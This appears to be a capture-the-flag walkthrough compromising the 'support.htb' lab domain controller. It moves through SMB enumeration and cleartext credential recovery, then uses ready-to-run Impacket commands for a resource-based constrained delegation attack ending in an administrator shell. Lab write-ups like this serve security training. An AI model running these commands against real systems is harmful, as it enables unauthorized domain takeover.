# Enumeration
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-13 15:17:21Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-03-13T15:17:24
|_  start_date: N/A
|_clock-skew: -22h27m54s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```
Enumerating smb with `smbmap -u guest -H dc.support.htb`
![](attachment/0eaa4c96ba9cc6c495d72e7a3b23f2c1.png)
We access the share with `smbclient \\\\dc.support.htb\\support-tools -N --no-pass`
![](attachment/1e4e24d5e0634cb95cc0acccac485a00.png)
Found an unusual app called UserInfo.exe so using mono to run it:
![](attachment/0a59824e486b625a5f1c069d6492d0ec.png)
![](attachment/b7b10ace6a12bcb93b670ed4c5431082.png)
Using wireshark to sniff the packets or can use DNSpy as it is a .NET application we find:
![](attachment/0596661da7b2ef0dc532acb477335171.png)
Following to TCP stream:
![](attachment/40a14c2895e1383b1292a0046e31c265.png)
This appears to be a cleartext password for a user called ldap
Trying the password with 
```
cme smb 10.10.11.174 -u ldap -p "$nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz"  
```
It doesnt work![](attachment/32b86ba267b37d2b66156fd739dfecfc.png)
But using single quotes and removing "$" makes it work.
![](attachment/f9ae5235e9d403f553c4af5f1971f6e8.png)
Now using bloodhound to collect info
```
bloodhound.py -dns-tcp -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -ns 10.10.11.174 -d support.htb -c all
```
We find almost nothing of value but the *support* user looks interesting

Now using ldapsearch 
```
ldapsearch  -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" -H ldap://support.htb > ldap.out
```
Now checking the info field in ldapsearch we find password for support:![](attachment/3f4567f9d3d91506e4601a7d98ace517.png)
support:Ironside47pleasure40Watchful`

Now we attack with the genericAll permission:
Creating a machine account:
`addcomputer.py -method SAMR -computer-name 'aditya' -computer-pass 'Aditya123@' -dc-host dc.support.htb -domain-netbios support.htb 'support.htb/support:Ironside47pleasure40Watchful'`
Delegation from aditya to dc:
`rbcd.py -delegate-from 'aditya$' -delegate-to 'dc$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'`
Now getting the ticket:
`getST.py -spn 'www/dc.support.htb' -impersonate administrator 'support.htb/aditya$:Aditya123@'`
Now to get a shell:
`KRB5CCNAME=administrator.ccache psexec.py -dc-ip 10.10.11.174 support.htb/administrator@dc.support.htb -k -no-pass`
![](attachment/6371698950c7a8efc5e46d6acb5c551a.png)
